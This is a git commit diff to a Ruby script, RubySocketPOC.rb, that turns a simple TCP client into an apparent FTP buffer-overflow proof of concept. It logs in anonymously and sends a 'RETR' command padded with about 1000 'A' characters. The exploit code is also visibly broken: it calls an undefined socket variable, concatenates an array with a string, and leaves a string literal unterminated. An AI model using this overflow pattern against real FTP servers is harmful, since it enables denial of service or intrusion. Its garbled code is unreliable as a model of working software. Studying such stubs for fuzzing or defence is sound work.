3e3226ad7ac138ba0372d81484d5f7f8b2ef2bee
xxdanbrowne <31517279+danb44545@users.noreply.github.com>
2019-07-17 23:30:10 -0600

    Update RubySocketPOC.rb

--- RubySocketPOC.rb
+++ RubySocketPOC.rb
@@ -3,9 +3,18 @@ require 'socket'        # Sockets are in standard library
 hostname = 'localhost'
 port = 2000
 
-client = TCPSocket.new(hostname, port)   # Client, connects to server on port 9911
-rhost  = client.peeraddr.last               
-# Get the remote server's IP address 
-client.gets.chomp
-client.puts "Hi, TCP Server #{rhost}"
-client.close
+client = TCPSocket.open(hostname, port)   # Client, connects to server on port 9911
+
+buff = ["A"]
+counter = 1000
+buff << "A" * counter
+
+s.recv(1024)
+s.send("USER anonymous\r\n",0)
+s.recv(1024)
+s.send("PASS billy@billy.com\r\n",0)
+s.recv(1024)
+s.send("RETR " + buff,0)
+s.recv(1024)
+s.send("QUIT\r\n,0)
+s.close
